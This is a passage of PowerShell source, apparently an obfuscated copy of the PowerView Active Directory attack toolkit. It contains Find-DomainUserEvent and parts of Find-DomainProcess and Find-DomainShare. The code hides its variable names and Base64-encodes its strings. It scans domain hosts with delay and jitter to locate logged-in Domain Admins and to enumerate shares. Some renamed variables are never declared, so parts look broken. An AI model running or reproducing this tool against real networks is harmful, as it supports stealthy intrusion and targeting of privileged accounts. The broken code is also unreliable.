            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAARABlAGwAYQB5ADoAIAAkAEQAZQBsAGEAeQAsACAASgBpAHQAdABlAHIAOgAgACQASgBpAHQAdABlAHIA')))
            ${521aceac22ed4af69dedda38f567c0ac} = 0
            ${6c074dff13fb478aa365aea23a93e2d2} = New-Object System.Random
            ForEach (${f54716d2d17141569e4a6cfb0d93653b} in ${ca0e0dbccca747a0b83a2af44d4d9165}) {
                ${521aceac22ed4af69dedda38f567c0ac} = ${521aceac22ed4af69dedda38f567c0ac} + 1
                Start-Sleep -Seconds ${6c074dff13fb478aa365aea23a93e2d2}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainProcess] Enumerating server ${f54716d2d17141569e4a6cfb0d93653b} (${521aceac22ed4af69dedda38f567c0ac} of $(${ca0e0dbccca747a0b83a2af44d4d9165}.count))"
                ${186e3848daf342ca8207aeecd0de4352} = Invoke-Command -ScriptBlock ${91e68d106c5344ba911e56802fc167ea} -ArgumentList ${f54716d2d17141569e4a6cfb0d93653b}, ${c19c85de646e4dfd941dff20846794c3}, ${4b406f96881443dfb2a0a5023913353c}, $Credential
                ${186e3848daf342ca8207aeecd0de4352}
                if (${186e3848daf342ca8207aeecd0de4352} -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAVABhAHIAZwBlAHQAIAB1AHMAZQByACAAZgBvAHUAbgBkACwAIAByAGUAdAB1AHIAbgBpAG4AZwAgAGUAYQByAGwAeQA=')))
                    return
                }
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAVQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwA6ACAAJABUAGgAcgBlAGEAZABzAA==')))
            ${96683e5d4de842f184dbc8ff33d066b2} = @{
                'ProcessName' = ${c19c85de646e4dfd941dff20846794c3}
                'TargetUsers' = ${4b406f96881443dfb2a0a5023913353c}
                'Credential' = $Credential
            }
            afa7981a0a8840e7ae58b8e0c696a5d3 -ac645935110b4eaea96e7bf6f0b2d7f4 ${ca0e0dbccca747a0b83a2af44d4d9165} -d8bca3485d0e4462855c0f18d0a8d91d ${91e68d106c5344ba911e56802fc167ea} -bf25cd70880740848c7344c3829474ee ${96683e5d4de842f184dbc8ff33d066b2} -Threads $Threads
        }
    }
}
function Find-DomainUserEvent {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4},
        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $Filter,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${ef288d403331462bbd4c88173b2e07a9} = [DateTime]::Now.AddDays(-1),
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${dfe397cdf0b74d6d8984c08a995717ad} = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,
        [Switch]
        $CheckAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${fd6c4173863b4be9aa10603a30f19bb1} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) {
            ${4b406f96881443dfb2a0a5023913353c} = c4bfd1c2423d4aa09ab761a468a38f7e @fd6c4173863b4be9aa10603a30f19bb1 | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBHAHIAbwB1AHAASQBkAGUAbgB0AGkAdAB5AA==')))] -or (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIA')))])) {
            ${352237a1f2ea46558662166b4069b35c} = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBHAHIAbwB1AHAASQBkAGUAbgB0AGkAdAB5ADoAIAAkAFUAcwBlAHIARwByAG8AdQBwAEkAZABlAG4AdABpAHQAeQA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${4b406f96881443dfb2a0a5023913353c} = d5ea7ec938ad4aeeacb8bc5e972e183f @352237a1f2ea46558662166b4069b35c | Select-Object -ExpandProperty MemberName
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${ca0e0dbccca747a0b83a2af44d4d9165} = ${ac645935110b4eaea96e7bf6f0b2d7f4}
        }
        else {
            ${1fb15456314f40c0ba1d4a0a93eaccaf} = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${1fb15456314f40c0ba1d4a0a93eaccaf}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${1fb15456314f40c0ba1d4a0a93eaccaf}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${1fb15456314f40c0ba1d4a0a93eaccaf}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAZABvAG0AYQBpAG4AIABjAG8AbgB0AHIAbwBsAGwAZQByAHMAIABpAG4AIABkAG8AbQBhAGkAbgA6ACAAJABEAG8AbQBhAGkAbgA=')))
            ${ca0e0dbccca747a0b83a2af44d4d9165} = cd8c63b899224544917fb2ed84dfed27 @1fb15456314f40c0ba1d4a0a93eaccaf | Select-Object -ExpandProperty dnshostname
        }
        if (${ca0e0dbccca747a0b83a2af44d4d9165} -and (${ca0e0dbccca747a0b83a2af44d4d9165} -isnot [System.Array])) {
            ${ca0e0dbccca747a0b83a2af44d4d9165} = @(,${ca0e0dbccca747a0b83a2af44d4d9165})
        }
        Write-Verbose "[Find-DomainUserEvent] TargetComputers length: $(${ca0e0dbccca747a0b83a2af44d4d9165}.Length)"
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFQAYQByAGcAZQB0AEMAbwBtAHAAdQB0AGUAcgBzACAAJAB7AGMAYQAwAGUAMABkAGIAYwBjAGMAYQA3ADQANwBhADAAYgA4ADMAYQAyAGEAZgA0ADQAZAA0AGQAOQAxADYANQB9AA==')))
        if (${ca0e0dbccca747a0b83a2af44d4d9165}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAE4AbwAgAGgAbwBzAHQAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAGUAbgB1AG0AZQByAGEAdABlAA==')))
        }
        ${91e68d106c5344ba911e56802fc167ea} = {
            Param(${ac645935110b4eaea96e7bf6f0b2d7f4}, ${ef288d403331462bbd4c88173b2e07a9}, ${dfe397cdf0b74d6d8984c08a995717ad}, $MaxEvents, ${4b406f96881443dfb2a0a5023913353c}, $Filter, $Credential)
            ForEach (${f54716d2d17141569e4a6cfb0d93653b} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
                ${d7b577ae558c406581a98832155768ff} = Test-Connection -Count 1 -Quiet -ComputerName ${f54716d2d17141569e4a6cfb0d93653b}
                if (${d7b577ae558c406581a98832155768ff}) {
                    ${1226670dbb6d45ca804d01864b96fd06} = @{
                        'ComputerName' = ${f54716d2d17141569e4a6cfb0d93653b}
                    }
                    if (${ef288d403331462bbd4c88173b2e07a9}) { ${1226670dbb6d45ca804d01864b96fd06}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AFQAaQBtAGUA')))] = ${ef288d403331462bbd4c88173b2e07a9} }
                    if (${dfe397cdf0b74d6d8984c08a995717ad}) { ${1226670dbb6d45ca804d01864b96fd06}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGQAVABpAG0AZQA=')))] = ${dfe397cdf0b74d6d8984c08a995717ad} }
                    if ($MaxEvents) { ${1226670dbb6d45ca804d01864b96fd06}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgARQB2AGUAbgB0AHMA')))] = $MaxEvents }
                    if ($Credential) { ${1226670dbb6d45ca804d01864b96fd06}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    if ($Filter -or ${4b406f96881443dfb2a0a5023913353c}) {
                        if (${4b406f96881443dfb2a0a5023913353c}) {
                            a5ac435dfb2d4f2f949ec249cd4857fa @1226670dbb6d45ca804d01864b96fd06 | Where-Object {${4b406f96881443dfb2a0a5023913353c} -contains $_.TargetUserName}
                        }
                        else {
                            ${fc0eea313cbd4e36810d5d8aa0c66243} = 'or'
                            $Filter.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAbwByAA==')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBvAG4A'))))) {
                                    if (($Filter[$_] -match '&') -or ($Filter[$_] -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBuAGQA'))))) {
                                        ${fc0eea313cbd4e36810d5d8aa0c66243} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBuAGQA')))
                                    }
                                }
                            }
                            ${0890a84b7f1d48f1a70abf61d657cf76} = $Filter.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAbwByAA==')))) -and ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBvAG4A'))))}
                            a5ac435dfb2d4f2f949ec249cd4857fa @1226670dbb6d45ca804d01864b96fd06 | ForEach-Object {
                                if (${fc0eea313cbd4e36810d5d8aa0c66243} -eq 'or') {
                                    ForEach (${ce081e5a91d149619816a7bc035e290e} in ${0890a84b7f1d48f1a70abf61d657cf76}) {
                                        if ($_."${ce081e5a91d149619816a7bc035e290e}" -match $Filter[${ce081e5a91d149619816a7bc035e290e}]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    ForEach (${ce081e5a91d149619816a7bc035e290e} in ${0890a84b7f1d48f1a70abf61d657cf76}) {
                                        if ($_."${ce081e5a91d149619816a7bc035e290e}" -notmatch $Filter[${ce081e5a91d149619816a7bc035e290e}]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        a5ac435dfb2d4f2f949ec249cd4857fa @1226670dbb6d45ca804d01864b96fd06
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainUserEvent] Total number of hosts: $(${ca0e0dbccca747a0b83a2af44d4d9165}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAEQAZQBsAGEAeQA6ACAAJABEAGUAbABhAHkALAAgAEoAaQB0AHQAZQByADoAIAAkAEoAaQB0AHQAZQByAA==')))
            ${521aceac22ed4af69dedda38f567c0ac} = 0
            ${6c074dff13fb478aa365aea23a93e2d2} = New-Object System.Random
            ForEach (${f54716d2d17141569e4a6cfb0d93653b} in ${ca0e0dbccca747a0b83a2af44d4d9165}) {
                ${521aceac22ed4af69dedda38f567c0ac} = ${521aceac22ed4af69dedda38f567c0ac} + 1
                Start-Sleep -Seconds ${6c074dff13fb478aa365aea23a93e2d2}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainUserEvent] Enumerating server ${f54716d2d17141569e4a6cfb0d93653b} (${521aceac22ed4af69dedda38f567c0ac} of $(${ca0e0dbccca747a0b83a2af44d4d9165}.count))"
                ${186e3848daf342ca8207aeecd0de4352} = Invoke-Command -ScriptBlock ${91e68d106c5344ba911e56802fc167ea} -ArgumentList ${f54716d2d17141569e4a6cfb0d93653b}, ${ef288d403331462bbd4c88173b2e07a9}, ${dfe397cdf0b74d6d8984c08a995717ad}, $MaxEvents, ${4b406f96881443dfb2a0a5023913353c}, $Filter, $Credential
                ${186e3848daf342ca8207aeecd0de4352}
                if (${186e3848daf342ca8207aeecd0de4352} -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFQAYQByAGcAZQB0ACAAdQBzAGUAcgAgAGYAbwB1AG4AZAAsACAAcgBlAHQAdQByAG4AaQBuAGcAIABlAGEAcgBsAHkA')))
                    return
                }
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFUAcwBpAG4AZwAgAHQAaAByAGUAYQBkAGkAbgBnACAAdwBpAHQAaAAgAHQAaAByAGUAYQBkAHMAOgAgACQAVABoAHIAZQBhAGQAcwA=')))
            ${96683e5d4de842f184dbc8ff33d066b2} = @{
                'StartTime' = ${ef288d403331462bbd4c88173b2e07a9}
                'EndTime' = ${dfe397cdf0b74d6d8984c08a995717ad}
                'MaxEvents' = $MaxEvents
                'TargetUsers' = ${4b406f96881443dfb2a0a5023913353c}
                'Filter' = $Filter
                'Credential' = $Credential
            }
            afa7981a0a8840e7ae58b8e0c696a5d3 -ac645935110b4eaea96e7bf6f0b2d7f4 ${ca0e0dbccca747a0b83a2af44d4d9165} -d8bca3485d0e4462855c0f18d0a8d91d ${91e68d106c5344ba911e56802fc167ea} -bf25cd70880740848c7344c3829474ee ${96683e5d4de842f184dbc8ff33d066b2} -Threads $Threads
        }
    }
}
function Find-DomainShare {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4},
        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Alias('CheckAccess')]
        [Switch]
        $CheckShareAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${f613cdfca6cd4ec9830841a185fa0248} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${a641242359464a5bb75a49b867c183a4} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${de1879a6375144efa1511357bfecd42f} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${b0dd23003b9d4473818f6e8c6cc2e082} }
